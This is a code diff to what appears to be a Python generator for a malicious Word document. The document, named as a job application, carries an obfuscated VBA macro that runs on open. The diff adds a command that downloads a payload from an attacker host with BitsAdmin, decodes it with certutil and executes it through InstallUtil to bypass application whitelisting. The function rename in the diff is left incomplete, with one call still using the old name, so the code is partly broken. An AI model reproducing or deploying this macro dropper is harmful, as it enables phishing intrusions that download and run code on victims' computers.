@@ -3,6 +3,7 @@ import ak
 
 CAESAR_NUM = 17
 DOC_NAME = "Job Application 53.doc"
+
 VBA_MACRO = """
 Function Pears(Beets)
     Pears = Chr(Beets - {CAESAR_NUM})
@@ -16,12 +17,12 @@ Function Almonds(Jelly)
     Almonds = Right(Jelly, Len(Jelly) - 3)
 End Function
 
-Function Nuts(Milk)
+Function Rats(Milk)
     Do
     Oatmilk = Oatmilk + Pears(Strawberries(Milk))
     Milk = Almonds(Milk)
     Loop While Len(Milk) > 0
-    Nuts = Oatmilk
+    Rats = Oatmilk
 End Function
 
 Sub MyMacro()
@@ -30,10 +31,10 @@ Sub MyMacro()
     If ActiveDocument.Name <> Nuts("{DOC_NAME}") Then
         Exit Sub
     End If
-    
+
     Apples = "{CMD}"
-    Water = Nuts(Apples)
-    GetObject(Nuts("{OBJ}")).Get(Nuts("{GET}")).Create Water, Tea, Coffee, Napkins
+    Water = Rats(Apples)
+    GetObject(Rats("{OBJ}")).Get(Rats("{GET}")).Create Water, Tea, Coffee, Napkins
 End Sub
 
 Sub AutoOpen()
@@ -44,7 +45,7 @@ Sub Document_Open()
     MyMacro
 End Sub
 """
-CMD = f"cmd.exe /c BitsAdmin /Transfer myJob http://{ak.LHOST}/Bypass C:\\Windows\\tasks\\bp && C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\tasks\\bp"
+CMD = f"cmd.exe /c BitsAdmin /Transfer myJob http://{ak.LHOST}/Bypass.txt C:\\Windows\\tasks\\bp.txt && certutil -f -decode C:\\Windows\\tasks\\bp.txt C:\\Windows\\tasks\\bp && del C:\\Windows\\tasks\\bp.txt && C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\tasks\\bp"
 
 
 def encrypt_string(text):
